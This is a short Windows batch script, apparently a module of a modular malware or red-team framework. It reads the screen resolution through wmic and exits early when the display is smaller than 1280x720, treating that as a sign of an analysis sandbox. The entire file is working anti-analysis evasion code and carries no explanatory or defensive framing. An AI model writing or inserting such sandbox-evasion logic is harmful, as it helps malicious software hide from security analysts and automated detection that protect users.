REM provides: evasion_screen_check
REM depends: (none)
REM description: Check screen resolution to detect sandbox environments

REM Sandboxes typically have low screen resolution (800x600, 1024x768)
for /f "tokens=2 delims==" %%r in ('wmic path Win32_VideoController get CurrentHorizontalResolution /value 2^>nul ^| findstr "="') do (
    set "SCREEN_W=%%r"
)

REM If resolution is below 1280, likely a sandbox
if defined SCREEN_W (
    if %SCREEN_W% LSS 1280 exit /b 0
)

REM Also check vertical resolution
for /f "tokens=2 delims==" %%r in ('wmic path Win32_VideoController get CurrentVerticalResolution /value 2^>nul ^| findstr "="') do (
    set "SCREEN_H=%%r"
)

if defined SCREEN_H (
    if %SCREEN_H% LSS 720 exit /b 0
)
